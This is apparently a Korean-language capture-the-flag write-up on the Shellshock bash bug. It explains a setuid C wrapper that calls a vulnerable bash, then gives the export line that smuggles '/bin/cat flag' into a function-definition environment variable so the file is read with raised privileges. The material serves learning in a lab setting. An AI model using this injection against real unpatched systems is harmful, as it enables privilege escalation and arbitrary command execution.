![[{5EBBFB66-000D-459A-A1B4-B662E4F4AC11}.png]]

```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

`setresuid`, `setresgid`: SET R(eal), E(ffective), S(aved) UID/GID
프로세스의 real UID/GID, effective UID/GID, saved set-user-ID를 변경하는 함수라고 한다.

`getegid`: 현재 실행하고 있는 프로세스의 effective GID를 얻는 함수이다.

위 코드는 real, effective, saved UID, GID를 모두 effective GID로 변경하는 것 같다.

#### shellshock

환경변수로는 변수와 함수가 등록될 수 있다.
- 변수 등록: `export 변수명='변수값'`
- 함수 등록: `export -f 함수명(){함수 body;}`

shellshock은 2014년 발견된 보안 취약점으로, 환경변수를 통한 코드 인젝션 기법으로 특정 코드를 삽입하여 실행한다.

`환경변수 x = (함수명){수행코드}; 공격명령`

환경변수를 등록하는 `(함수명){수행코드}`까지는 정상적으로 동작하고 그 이후 삽입되는 공격명령은 무시되거나 오류가 발생해야 하지만 실제로는 수행되는 것이다.

이를 이용해서 작성한 코드는 다음과 같다.

```shell
$ export x='() { echo hello; }; /bin/cat flag'
```

() 후에 공백이 있는 이유는 함수 이름을 빈칸으로 주기 위해서이다. 주의!

![[{7034D575-7C95-43CF-AE4D-6AF911395D89}.png]]

🚩